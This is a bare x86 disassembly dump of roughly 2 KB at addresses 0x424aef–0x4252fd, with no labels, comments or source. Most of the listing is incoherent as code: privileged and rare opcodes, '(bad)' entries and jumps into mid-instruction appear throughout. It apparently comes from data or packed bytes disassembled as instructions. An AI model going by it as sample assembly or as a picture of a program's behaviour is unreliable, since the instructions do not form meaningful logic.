  424aef:	leave  
  424af0:	push   es
  424af1:	jo     0x424af3
  424af3:	add    BYTE PTR [eax],al
  424af5:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424afb:	pushf  
  424afc:	add    BYTE PTR [eax],al
  424afe:	add    BYTE PTR [edx],cl
  424b00:	pop    ss
  424b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b02:	add    BYTE PTR [eax],al
  424b04:	add    cl,cl
  424b06:	push   es
  424b07:	lods   al,BYTE PTR ds:[esi]
  424b08:	add    BYTE PTR [eax],al
  424b0a:	add    BYTE PTR [edx-0x61],cl
  424b0d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b13:	add    BYTE PTR [eax],al
  424b15:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b1b:	les    eax,FWORD PTR [eax]
  424b1d:	add    BYTE PTR [eax],al
  424b1f:	popa   
  424b20:	lahf   
  424b21:	xchg   BYTE PTR ds:0x9006c9,dh
  424b27:	add    BYTE PTR [eax],al
  424b29:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b2f:	aam    0x0
  424b31:	add    BYTE PTR [eax],al
  424b33:	call   0xa77d1d7
  424b38:	iret   
  424b39:	fadd   QWORD PTR [eax]
  424b3b:	add    BYTE PTR [eax],al
  424b3d:	leave  
  424b3e:	push   es
  424b3f:	in     al,0x0
  424b41:	add    BYTE PTR [eax],al
  424b43:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b49:	add    ecx,ecx
  424b4b:	jbe    0x424b52
  424b4d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b53:	or     ecx,ecx
  424b55:	jbe    0x424b23
  424b57:	inc    ecx
  424b58:	lahf   
  424b59:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b5f:	jbe    0x424b86
  424b61:	pusha  
  424b62:	lahf   
  424b63:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b69:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b6f:	int3   
  424b70:	push   es
  424b71:	jo     0x424b73
  424b73:	add    BYTE PTR [eax],al
  424b75:	shr    ebx,cl
  424b77:	xchg   edx,eax
  424b78:	add    DWORD PTR [edx],eax
  424b7a:	scas   eax,DWORD PTR es:[edi]
  424b7b:	or     esp,ecx
  424b7d:	test   DWORD PTR [eax+eax*1+0x0],eax
  424b81:	add    BYTE PTR [esp+eax*1-0x7],ch
  424b85:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424b8b:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424b95:	add    BYTE PTR [eax-0x7c],dh
  424b98:	int    0xb3
  424b9a:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424ba0:	inc    esp
  424ba1:	add    BYTE PTR [eax],al
  424ba3:	add    BYTE PTR [edx+0x70],ah
  424ba6:	add    BYTE PTR [ecx-0x78],dh
  424ba9:	or     dh,BYTE PTR [esi+0x7d]
  424bac:	iret   
  424bad:	jbe    0x424b6c
  424baf:	jo     0x424b7e
  424bb1:	or     BYTE PTR ds:0x808081,ah
  424bb7:	push   eax
  424bb8:	int    0x76
  424bba:	jge    0x424bbc
  424bbc:	icebp  
  424bbd:	int    0x76
  424bbf:	std    
  424bc0:	int    0x8d
  424bc2:	std    
  424bc3:	cmp    edi,DWORD PTR [ecx+0x4]
  424bc6:	add    bh,bh
  424bc8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bce:	push   ebx
  424bcf:	ror    DWORD PTR [edx],cl
  424bd1:	jbe    0x424be0
  424bd3:	int    0x8d
  424bd5:	std    
  424bd6:	int    0x76
  424bd8:	std    
  424bd9:	cmp    ecx,DWORD PTR [edi]
  424bdb:	add    al,0x11
  424bdd:	call   ebx
  424bdf:	lods   eax,DWORD PTR ds:[esi]
  424be0:	sub    bl,dl
  424be2:	jmp    0x424b76
  424be4:	push   ebx
  424be5:	jge    0x424bb4
  424be7:	jbe    0x424ba6
  424be9:	inc    ebx
  424bea:	rcl    esp,cl
  424bec:	xchg   esi,eax
  424bed:	or     dh,BYTE PTR [esi+0x75]
  424bf0:	in     al,dx
  424bf1:	das    
  424bf2:	int    0x80
  424bf4:	int    0x8d
  424bf6:	jne    0x424c02
  424bf8:	jbe    0x424bb7
  424bfa:	int    0x76
  424bfc:	mov    ebp,0x4dd4d343
  424c01:	int    0x70
  424c03:	sbb    al,0xcd
  424c05:	mov    bl,0x25
  424c07:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c11:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c1b:	int    0xb3
  424c1d:	sub    eax,0xcd808081
  424c22:	xchg   esi,eax
  424c23:	dec    esp
  424c24:	int    0x62
  424c26:	cmp    al,0x87
  424c28:	xor    DWORD PTR [edx],ecx
  424c2a:	jo     0x424c50
  424c2c:	int    0x76
  424c2e:	stc    
  424c2f:	int    0x8d
  424c31:	stc    
  424c32:	cmp    edi,DWORD PTR [ecx+0x4]
  424c35:	add    bh,bh
  424c37:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c3d:	push   ebx
  424c3e:	ror    DWORD PTR [edx],cl
  424c40:	jbe    0x424c4f
  424c42:	int    0x96
  424c44:	and    al,0x9a
  424c46:	pop    ebx
  424c47:	mov    ebp,0xf5e2
  424c4c:	push   es
  424c4d:	ins    DWORD PTR es:[edi],dx
  424c4e:	das    
  424c4f:	add    eax,0x80808099
  424c54:	add    dh,dl
  424c56:	and    al,0xcd
  424c58:	lock pop ebx
  424c5a:	mov    ebp,0xf52c
  424c5f:	push   es
  424c60:	ins    DWORD PTR es:[edi],dx
  424c61:	das    
  424c62:	add    eax,0x808080c5
  424c67:	int    0x76
  424c69:	and    al,0xcd
  424c6b:	lock int 0xd5
  424c6e:	mov    ebp,0xfbe7
  424c73:	push   es
  424c74:	ins    DWORD PTR es:[edi],dx
  424c75:	das    
  424c76:	add    eax,0x808080d1
  424c7b:	call   0x0:0xf90ebd5b
  424c82:	push   es
  424c83:	ins    DWORD PTR es:[edi],dx
  424c84:	das    
  424c85:	add    eax,0x8080802d
  424c8a:	int    0x8
  424c8c:	and    eax,0x43808081
  424c91:	sbb    al,0xd6
  424c93:	sbb    cl,ch
  424c95:	or     BYTE PTR [ecx],dl
  424c97:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424ca1:	int    0x8d
  424ca3:	dec    esp
  424ca4:	add    BYTE PTR [ecx+0x70005b94],dl
  424caa:	and    al,0xcd
  424cac:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424cb2:	or     ch,0x7d
  424cb5:	cmp    ecx,DWORD PTR [edi]
  424cb7:	add    al,0x11
  424cb9:	call   ebx
  424cbb:	jmp    0x424c4f
  424cbd:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424cc3:	(bad)
  424cc7:	dec    ecx
  424cc8:	and    BYTE PTR [esi-0x778932cb],al
  424cce:	int    0x8d
  424cd0:	mov    ch,cl
  424cd2:	jbe    0x424cf8
  424cd4:	shr    ebx,cl
  424cd6:	xchg   edx,eax
  424cd7:	adc    al,BYTE PTR [edx]
  424cd9:	scas   eax,DWORD PTR es:[edi]
  424cda:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424ce0:	sbb    ch,cl
  424ce2:	ins    BYTE PTR es:[edi],dx
  424ce3:	cmp    al,0xcd
  424ce5:	lea    ebp,[edi+eax*4]
  424ce8:	lds    ecx,FWORD PTR [edx]
  424cea:	outs   dx,BYTE PTR ds:[esi]
  424ceb:	adc    al,0xcd
  424ced:	jbe    0x424d1b
  424cef:	leave  
  424cf0:	add    BYTE PTR [edi-0x327f7f80],0x76
  424cf7:	sub    al,0xa
  424cf9:	pushf  
  424cfa:	test   ch,cl
  424cfc:	jbe    0x424d2e
  424cfe:	int    0x8d
  424d00:	sub    al,0xa
  424d02:	outs   dx,BYTE PTR ds:[esi]
  424d03:	mov    ch,cl
  424d05:	jbe    0x424d1b
  424d07:	int    0x8d
  424d09:	sub    al,0xa
  424d0b:	outs   dx,BYTE PTR ds:[esi]
  424d0c:	dec    esp
  424d0d:	in     al,dx
  424d0e:	adc    al,0xcd
  424d10:	jbe    0x424d36
  424d12:	int    0x6c
  424d14:	cmp    al,0xcd
  424d16:	lea    ebp,[edi+eax*4]
  424d19:	lds    ecx,FWORD PTR [edx]
  424d1b:	outs   dx,BYTE PTR ds:[esi]
  424d1c:	adc    al,0xcd
  424d1e:	jbe    0x424d4c
  424d20:	add    al,0x2c
  424d22:	or     cl,0x76
  424d25:	icebp  
  424d26:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d30:	cmp    ebx,ebp
  424d32:	int    0xc5
  424d34:	arpl   sp,bp
  424d36:	xchg   edx,eax
  424d37:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d3a:	test   al,0xcb
  424d3c:	shl    BYTE PTR [eax+eax*4],cl
  424d3f:	xchg   esi,eax
  424d40:	int    0xed
  424d42:	jno    0x424db5
  424d44:	das    
  424d45:	mov    ebx,0x74cf146e
  424d4a:	mov    BYTE PTR [edi+ebp*1],bl
  424d4d:	mov    ebx,0x9a5b867e
  424d52:	leave  
  424d53:	jbe    0x424d52
  424d55:	dec    ecx
  424d56:	and    DWORD PTR [esi-0x672f5cb],eax
  424d5c:	push   es
  424d5d:	retf   
  424d5e:	aam    0xb4
  424d60:	popa   
  424d61:	shl    DWORD PTR [ecx],1
  424d63:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d69:	out    0x88,al
  424d6b:	xchg   edx,edi
  424d6d:	pop    esi
  424d6e:	out    0x4c,al
  424d70:	or     BYTE PTR [ebp-0x33],0xdc
  424d74:	mov    BYTE PTR [edi-0x77197806],al
  424d7a:	pop    esi
  424d7b:	out    0x4c,al
  424d7d:	cmp    BYTE PTR [edx-0x33],0x8d
  424d81:	std    
  424d82:	int    0xe6
  424d84:	std    
  424d85:	cmp    edx,DWORD PTR [ebx]
  424d87:	add    al,0xf8
  424d89:	call   ebx
  424d8b:	jmp    0xd41e1ab8
  424d90:	in     al,dx
  424d91:	xchg   edx,eax
  424d92:	push   ebx
  424d93:	cld    
  424d94:	add    al,0xf2
  424d96:	std    
  424d97:	add    al,0xd3
  424d99:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424da0:	sub    BYTE PTR [ebx-0x6],dl
  424da3:	adc    bh,al
  424da5:	dec    ecx
  424da6:	and    DWORD PTR [esi-0x2197ecb],eax
  424dac:	int    0x8d
  424dae:	std    
  424daf:	int    0xe6
  424db1:	std    
  424db2:	cmp    edx,DWORD PTR [ebx]
  424db4:	add    al,0xf8
  424db6:	call   ebx
  424db8:	jmp    0x424d4c
  424dba:	shr    ecx,cl
  424dbc:	sub    BYTE PTR [ebx-0x10],dl
  424dbf:	inc    ebx
  424dc0:	(bad)  
  424dc1:	stc    
  424dc2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424dc9:	ror    BYTE PTR [eax-0x12326980],cl
  424dcf:	add    al,0xed
  424dd1:	push   eax
  424dd2:	leave  
  424dd3:	jbe    0x424d7a
  424dd5:	mov    edx,0xc98080ac
  424dda:	jbe    0x424d91
  424ddc:	xchg   eax,ecx
  424dde:	add    BYTE PTR [eax-0x68528937],0x40
  424de5:	add    BYTE PTR [eax-0x51068937],0x30
  424dec:	test   BYTE PTR [eax-0x4a028937],al
  424df2:	lods   al,BYTE PTR ds:[esi]
  424df3:	add    BYTE PTR [eax+0x69f176c9],0x53
  424dfa:	add    BYTE PTR [eax-0x76a8937],0x42
  424e01:	add    BYTE PTR [eax-0x78628937],0x80
  424e08:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e0f:	add    BYTE PTR [eax-0x32128937],0x71
  424e16:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e1d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e24:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e2a:	(bad)  
  424e2b:	stc    
  424e2c:	cmp    ebx,edx
  424e2e:	clc    
  424e2f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e35:	repnz popa 
  424e37:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e3d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e44:	add    BYTE PTR [eax+0x3cded312],0x80
  424e4b:	or     cl,0x76
  424e4e:	cmc    
  424e4f:	icebp  
  424e50:	lea    eax,[eax-0x2893680]
  424e56:	jnp    0x424e2c
  424e58:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e5f:	add    BYTE PTR [eax-0x32068933],0x96
  424e66:	std    
  424e67:	ss dec eax
  424e69:	pushf  
  424e6a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424e71:	int    0xe3
  424e73:	push   esi
  424e74:	jp     0x424e75
  424e76:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424e7d:	int    0x76
  424e7f:	std    
  424e80:	xchg   DWORD PTR [esi-0x78],esi
  424e83:	int    0x96
  424e85:	std    
  424e86:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424e8c:	xor    ch,cl
  424e8e:	jbe    0x424ea1
  424e90:	int    0x96
  424e92:	in     eax,dx
  424e93:	sbb    BYTE PTR ss:[edi-0x80],cl
  424e97:	cmp    BYTE PTR [ebx],0xd2
  424e9a:	int    0x96
  424e9c:	mov    ebp,0xe261d253
  424ea1:	fadd   DWORD PTR [eax-0x320ecc80]
  424ea7:	jbe    0x424e5e
  424ea9:	xchg   DWORD PTR [ebx],edx
  424eab:	popa   
  424eac:	fist   WORD PTR [eax+eax*4-0x80]
  424eb0:	xor    esi,ecx
  424eb2:	xchg   DWORD PTR [esi-0x5a893253],edx
  424eb8:	int    0xd6
  424eba:	xor    ch,cl
  424ebc:	out    0x9d,al
  424ebe:	adc    bh,bl
  424ec0:	mov    DWORD PTR [ecx-0x80],esi
  424ec3:	sub    BYTE PTR [ebx],0xf1
  424ec6:	int    0x76
  424ec8:	xchg   ebp,eax
  424ec9:	adc    bh,bl
  424ecb:	mov    dh,0x2c
  424ecd:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424ed4:	clc    
  424ed5:	int    0x96
  424ed7:	icebp  
  424ed8:	push   esi
  424ed9:	out    0x1e,al
  424edb:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424ee2:	icebp  
  424ee3:	adc    dh,bl
  424ee5:	pop    es
  424ee6:	push   edx
  424ee7:	add    BYTE PTR [eax+0x72f9943],0x63
  424eee:	add    BYTE PTR [eax],al
  424ef0:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424ef6:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424efd:	pop    ebx
  424efe:	cwde   
  424eff:	call   0x8043:0xd9ed76c9
  424f06:	or     cl,0x76
  424f09:	adc    DWORD PTR [edx+0x7e],esi
  424f0c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f13:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f1a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f21:	add    BYTE PTR [eax-0x275a8937],0x58
  424f28:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f2f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f36:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f3d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f44:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f4b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f52:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f59:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f60:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f67:	add    BYTE PTR [eax-0x32528933],0x8d
  424f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f6f:	dec    ebp
  424f70:	bound  ebp,QWORD PTR [ebx]
  424f72:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424f79:	dec    ebp
  424f7a:	pop    ds
  424f7b:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424f81:	pop    edi
  424f82:	xchg   ecx,eax
  424f83:	mov    bh,0x7e
  424f85:	stc    
  424f86:	xor    edi,DWORD PTR [ebp-0x33]
  424f89:	jbe    0x424f88
  424f8b:	int    0x96
  424f8d:	stc    
  424f8e:	sub    edx,edx
  424f90:	int    0x96
  424f92:	cmc    
  424f93:	dec    ebp
  424f94:	inc    edi
  424f95:	outs   dx,DWORD PTR ds:[esi]
  424f96:	add    BYTE PTR [eax-0x69322dcd],0x11
  424f9d:	xor    edx,edx
  424f9f:	int    0x96
  424fa1:	in     eax,dx
  424fa2:	push   ebx
  424fa3:	sar    BYTE PTR [ebx],cl
  424fa5:	fisubr DWORD PTR [ecx-0x27]
  424fa8:	ret    
  424fa9:	add    BYTE PTR [eax],al
  424fab:	clc    
  424fac:	test   ebp,0x72c34c96
  424fb2:	push   ds
  424fb3:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424fba:	int    0xd6
  424fbc:	mov    ch,0x33
  424fbe:	leave  
  424fbf:	das    
  424fc0:	sar    DWORD PTR [ecx+0x69],1
  424fc3:	fisttp DWORD PTR [edx]
  424fc5:	xchg   ecx,eax
  424fc6:	mov    ebx,ebp
  424fc8:	popa   
  424fc9:	add    BYTE PTR [eax-0x6a893680],0x9b
  424fd0:	push   esp
  424fd1:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  424fd8:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  424fdf:	add    BYTE PTR [eax-0x7e5a8937],0x80
  424fe6:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  424fed:	pop    ebp
  424fee:	call   0xcdf4:0xf880806f
  424ff5:	xchg   esi,eax
  424ff6:	lods   eax,DWORD PTR ds:[esi]
  424ff7:	int    0xa6
  424ff9:	mov    BYTE PTR [ebx-0x2e],dl
  424ffc:	int    0x96
  424ffe:	popf   
  424fff:	xor    edx,edx
  425001:	int    0x96
  425003:	xchg   ebp,eax
  425004:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425006:	push   eax
  425007:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42500e:	mov    BYTE PTR [eax+0x2c],bl
  425011:	ret    0xafd
  425014:	jbe    0x424fab
  425016:	int    0x76
  425018:	icebp  
  425019:	int    0x96
  42501b:	or     eax,0xf3f7f534
  425020:	int    0x96
  425022:	xchg   ebp,eax
  425023:	xor    al,0x23
  425025:	inc    esp
  425026:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42502a:	inc    esi
  42502b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425032:	rol    esi,0x80
  425035:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42503c:	cmp    ebx,edx
  42503e:	clc    
  42503f:	hlt    
  425040:	int    0x96
  425042:	gs mov edi,0xc3d9
  425048:	ss aaa 
  42504a:	push   esi
  42504b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425052:	add    BYTE PTR [eax],al
  425054:	xchg   DWORD PTR [ebp-0x33],edi
  425057:	jbe    0x425056
  425059:	int    0x96
  42505b:	stc    
  42505c:	sub    edx,edx
  42505e:	int    0x96
  425060:	cmc    
  425061:	dec    ebp
  425062:	inc    edi
  425063:	outs   dx,DWORD PTR ds:[esi]
  425064:	add    BYTE PTR [eax-0x69322dcd],0x11
  42506b:	xor    edx,edx
  42506d:	int    0x96
  42506f:	in     eax,dx
  425070:	push   ebx
  425071:	sar    BYTE PTR [ebx],cl
  425073:	(bad)  
  425075:	hlt    
  425076:	int    0x96
  425078:	dec    esp
  425079:	xor    esi,ecx
  42507b:	int    0x76
  42507d:	mov    ebp,0x33b5a6cd
  425082:	leave  
  425083:	das    
  425084:	rol    ebp,1
  425086:	int    0xdb
  425088:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  42508e:	das    
  42508f:	pop    es
  425090:	pop    esp
  425091:	add    BYTE PTR [eax],al
  425093:	add    BYTE PTR [edx-0x2d349c58],ch
  425099:	mov    BYTE PTR [eax+0x4edcd96],al
  42509f:	in     eax,dx
  4250a0:	jo     0x42506b
  4250a2:	jbe    0x425074
  4250a4:	xchg   ecx,eax
  4250a5:	aaa    
  4250a6:	ficom  WORD PTR [ebx]
  4250a8:	pop    ebp
  4250a9:	mov    ebp,0xa25230a
  4250ae:	jbe    0x425105
  4250b0:	leave  
  4250b1:	jbe    0x425110
  4250b3:	mov    esi,0xa13de37
  4250b8:	jbe    0x42511f
  4250ba:	leave  
  4250bb:	jbe    0x42512a
  4250bd:	fidiv  WORD PTR [edi]
  4250bf:	ficom  WORD PTR [ebx]
  4250c1:	or     dh,BYTE PTR [esi+0x75]
  4250c4:	pop    ebx
  4250c5:	leave  
  4250c6:	jbe    0x425145
  4250c8:	scas   al,BYTE PTR es:[edi]
  4250c9:	aaa    
  4250ca:	ficom  WORD PTR [ebx]
  4250cc:	or     dh,BYTE PTR [esi+0xd]
  4250cf:	cwde   
  4250d0:	call   0xde37:0x96f176c9
  4250d7:	adc    ecx,DWORD PTR [edx]
  4250d9:	jbe    0x425070
  4250db:	cmp    ebx,edx
  4250dd:	cmp    eax,DWORD PTR [eax]
  4250df:	pop    edi
  4250e0:	dec    ecx
  4250e1:	and    DWORD PTR [esi-0x628936cb],eax
  4250e7:	out    0x37,al
  4250e9:	ficom  WORD PTR [ebx]
  4250eb:	jp     0x4250f7
  4250ed:	jbe    0x425094
  4250ef:	int    0xd3
  4250f1:	or     dl,BYTE PTR [esi-0x4a19f513]
  4250f7:	iret   
  4250f8:	xchg   ecx,eax
  4250f9:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425100:	push   ebx
  425101:	ror    bh,cl
  425103:	je     0x4250cc
  425105:	ror    ch,1
  425107:	xor    ch,cl
  425109:	pushf  
  42510a:	test   BYTE PTR [edi],ch
  42510c:	inc    ebp
  42510d:	loop   0x4250a1
  42510f:	shr    esp,cl
  425111:	xchg   edx,eax
  425112:	int    0x1c
  425114:	int    0x6c
  425116:	test   BYTE PTR [ebx],bh
  425118:	ins    DWORD PTR es:[edi],dx
  425119:	adc    bh,bl
  42511b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42511c:	mov    esi,0xf1534229
  425121:	or     dl,BYTE PTR [esi-0x6893207]
  425127:	xchg   DWORD PTR [ebp-0x2d],ebp
  42512a:	in     eax,0x28
  42512c:	inc    ebx
  42512d:	jbe    0x42517b
  42512f:	das    
  425130:	or     BYTE PTR [edi-0x327f7f80],bh
  425136:	jbe    0x425131
  425138:	add    al,0xb6
  42513a:	mov    ebp,0x11e60a80
  42513f:	int    0x76
  425141:	stc    
  425142:	push   es
  425143:	ins    DWORD PTR es:[edi],dx
  425144:	aam    0xb6
  425146:	cmp    ebp,DWORD PTR [ebp+0xa]
  425149:	out    0xf5,al
  42514b:	int    0x96
  42514d:	mov    ebp,0xcf88a6cd
  425152:	fs xor ch,cl
  425155:	xchg   esi,eax
  425156:	mov    BYTE PTR [edi-0x5269f527],al
  42515c:	retf   0x922
  42515f:	xchg   esi,eax
  425160:	add    ch,cl
  425162:	xchg   esi,eax
  425163:	stc    
  425164:	xchg   ecx,ebx
  425166:	retf   0x2014
  425169:	int    0xa6
  42516b:	lods   eax,DWORD PTR ds:[esi]
  42516c:	or     DWORD PTR [ebx],ebx
  42516e:	retf   0x96
  425171:	int    0xa6
  425173:	stc    
  425174:	xchg   ecx,esp
  425176:	int    0xe6
  425178:	mov    BYTE PTR [ecx],cl
  42517a:	adc    al,0x43
  42517c:	int    0x96
  42517e:	cmc    
  42517f:	ins    BYTE PTR es:[edi],dx
  425180:	add    al,0xea
  425182:	std    
  425183:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  425189:	push   ebx
  42518a:	sar    BYTE PTR [ebx],cl
  42518c:	ror    DWORD PTR [edx],cl
  42518e:	jbe    0x425185
  425190:	push   ecx
  425191:	(bad)  
  425192:	cmc    
  425193:	int    0x96
  425195:	cmc    
  425196:	add    al,0x11
  425198:	call   ebx
  42519a:	repz xchg edx,eax
  42519c:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251a2:	xchg   esi,eax
  4251a3:	stc    
  4251a4:	inc    ebx
  4251a5:	rol    BYTE PTR [edx+0x7a003ba7],cl
  4251ab:	int    0x76
  4251ad:	adc    ebp,ecx
  4251af:	xchg   esi,eax
  4251b0:	stc    
  4251b1:	int    0xa6
  4251b3:	mov    ebp,0xcffdad04
  4251b8:	test   cl,dh
  4251ba:	int    0x96
  4251bc:	stc    
  4251bd:	iret   
  4251be:	adc    al,0x5b
  4251c0:	int    0xa6
  4251c2:	dec    esp
  4251c3:	shl    ebx,cl
  4251c5:	sub    BYTE PTR [ebx-0x2e],dl
  4251c8:	cmp    edx,ebx
  4251ca:	or     dh,BYTE PTR [esi+0x11]
  4251cd:	push   ecx
  4251ce:	(bad)  
  4251cf:	adc    ebp,ecx
  4251d1:	xchg   esi,eax
  4251d2:	adc    DWORD PTR [ecx+edx*1],eax
  4251d5:	call   ebx
  4251d7:	repz xchg edx,eax
  4251d9:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251df:	xchg   esi,eax
  4251e0:	stc    
  4251e1:	xchg   edx,ebx
  4251e3:	xor    esp,edx
  4251e5:	or     dh,BYTE PTR [esi-0x43]
  4251e8:	inc    ebx
  4251e9:	lds    ebp,FWORD PTR [edi]
  4251eb:	pop    es
  4251ec:	outs   dx,DWORD PTR ds:[esi]
  4251ed:	add    BYTE PTR [eax],al
  4251ef:	add    ch,cl
  4251f1:	jbe    0x4251e0
  4251f3:	int    0x96
  4251f5:	mov    ch,0x4
  4251f7:	jmp    0xd384:0xd2046cfd
  4251fe:	mov    ebp,0x3bd25328
  425203:	ror    ebp,cl
  425205:	popf   
  425206:	int    0xf1
  425208:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42520e:	in     eax,0x28
  425210:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425216:	or     ah,BYTE PTR [esi-0x12697613]
  42521c:	add    al,0xe6
  42521e:	in     eax,dx
  42521f:	xchg   BYTE PTR [edi],ch
  425221:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425227:	test   al,0x63
  425229:	retf   
  42522a:	ror    BYTE PTR [eax-0x12326980],cl
  425230:	add    al,0xed
  425232:	adc    al,0xcd
  425234:	jbe    0x4251be
  425236:	leave  
  425237:	jbe    0x42524a
  425239:	dec    ecx
  42523a:	and    DWORD PTR [esi-0x28936cb],eax
  425240:	inc    ecx
  425241:	and    DWORD PTR [esi+0x5b80cd35],eax
  425247:	cwde   
  425248:	or     dh,BYTE PTR [esi-0x7]
  42524b:	leave  
  42524c:	jbe    0x425243
  42524e:	into   
  42524f:	and    DWORD PTR [esi+0x76c99a35],eax
  425255:	in     eax,dx
  425256:	inc    esi
  425257:	sbb    DWORD PTR [ebp-0x22932de],esi
  42525d:	int    0x8d
  42525f:	std    
  425260:	sar    bh,0x5d
  425263:	shl    DWORD PTR [ecx],1
  425265:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42526b:	repnz sub BYTE PTR [ebx],bh
  42526e:	adc    ebx,edx
  425270:	out    dx,eax
  425271:	xchg   edx,eax
  425272:	push   ebx
  425273:	add    cl,ch
  425275:	lea    edx,[ecx]
  425277:	int    0x96
  425279:	adc    DWORD PTR [ebx],edi
  42527b:	jge    0x4252b8
  42527d:	(bad)  
  42527f:	jmp    0x425213
  425281:	shr    edx,cl
  425283:	sub    BYTE PTR [ebx+0x13],dl
  425286:	das    
  425287:	rol    DWORD PTR [edx],1
  425289:	jmp    0x42522a
  42528b:	add    BYTE PTR [eax-0x6723280],0xcd
  425292:	xchg   esi,eax
  425293:	stc    
  425294:	cmp    ebx,ecx
  425296:	shr    edx,cl
  425298:	sub    BYTE PTR [ebx],bh
  42529a:	jge    0x42526f
  42529c:	jmp    0x425230
  42529e:	push   ebx
  42529f:	adc    ecx,ebp
  4252a1:	xchg   esi,eax
  4252a2:	std    
  4252a3:	int    0xa6
  4252a5:	std    
  4252a6:	cmp    esi,ecx
  4252a8:	cmp    esp,ecx
  4252aa:	shl    ebx,cl
  4252ac:	xchg   edx,eax
  4252ad:	shl    ebp,cl
  4252af:	sub    BYTE PTR [ebx-0x2b],dl
  4252b2:	push   es
  4252b3:	adc    ecx,ebp
  4252b5:	xchg   esi,eax
  4252b6:	stc    
  4252b7:	int    0x8d
  4252b9:	stc    
  4252ba:	aam    0x58
  4252bc:	cmp    esi,eax
  4252be:	shl    edx,cl
  4252c0:	sub    BYTE PTR [ebx],bh
  4252c2:	icebp  
  4252c3:	shl    ebx,cl
  4252c5:	xchg   edx,eax
  4252c6:	push   ebx
  4252c7:	jecxz  0x425296
  4252c9:	(bad)  
  4252ca:	std    
  4252cb:	int    0xa6
  4252cd:	std    
  4252ce:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252d1:	loope  0x4252a6
  4252d3:	jmp    0x425267
  4252d5:	shl    ebp,cl
  4252d7:	sub    BYTE PTR [ebx+0xc],dl
  4252da:	aad    0xf3
  4252dc:	int    0x8d
  4252de:	in     eax,dx
  4252df:	int    0xa6
  4252e1:	in     eax,dx
  4252e2:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252e5:	loope  0x4252ba
  4252e7:	jmp    0x42527b
  4252e9:	shl    ebp,cl
  4252eb:	sub    BYTE PTR [ebx+0xc],dl
  4252ee:	cmp    esp,ebx
  4252f0:	in     al,dx
  4252f1:	sub    al,0x3b
  4252f3:	lock shl edx,cl
  4252f6:	sub    BYTE PTR [ebx],bh
  4252f8:	icebp  
  4252f9:	shl    ebx,cl
  4252fb:	xchg   edx,eax
  4252fc:	push   ebx
  4252fd:	jecxz  0x4252cc
